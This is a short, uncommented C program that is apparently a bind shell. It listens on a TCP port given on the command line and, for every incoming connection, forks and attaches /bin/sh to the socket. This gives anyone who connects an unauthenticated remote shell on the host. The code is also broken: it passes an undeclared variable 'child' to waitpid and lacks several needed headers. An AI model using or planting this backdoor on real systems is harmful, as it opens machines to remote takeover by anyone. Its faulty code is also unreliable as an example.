#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int host_sockid;
int client_sockid;

struct sockaddr_in hostaddr;

int main(int argc, char** argv){
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);

    char* port = argv[1];

    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(atoi(port));
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

    listen(host_sockid, 10);

    while(1){
    	client_sockid = accept(host_sockid, NULL, NULL);

    	char *const argsv[] = {NULL};
    	extern char** environ;
    	char* const* envp = environ;
    	int pid = fork();

    	if(pid == 0){
    		dup2(client_sockid, 0);
    		dup2(client_sockid, 1);
    		dup2(client_sockid, 2);
    		execve("/bin/sh", argsv, envp);
    	}else{
		waitpid(child, NULL, 0);
    	}

    	close(client_sockid);
    }
    close(host_sockid);
    return 0;
}
